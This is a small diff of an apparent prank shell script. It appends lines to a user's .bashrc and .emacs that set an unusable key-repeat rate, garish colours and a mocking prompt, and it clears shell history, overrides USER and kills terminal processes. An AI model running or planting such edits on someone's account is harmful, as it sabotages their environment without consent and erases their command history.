@@ -20,11 +20,11 @@ echo "xset r rate 3;" >> /home/${USER}/.bashrc;
 echo "(set-face-background 'default \"pink\")" >> /home/${USER}/.emacs;
 echo "(set-face-foreground 'default \"lightblue\")" >> /home/${USER}/.emacs;
 echo "history -c" >> /home/${USER}/.bashrc;
-echo "PS1=snow_j@YouKnowNothing" >> /home/${USER}/.bashrc;
+echo "PS1=snow_j@YouKnowNothingJohnSnow$" >> /home/${USER}/.bashrc;
 xset b 100 2000 1500
 export USER=snow_j
 export LOGNAME=snow_j
 
-setxkbmap ru;
+#setxkbmap ru;
 history -c
-pkill xterm;
+pkill terminal;
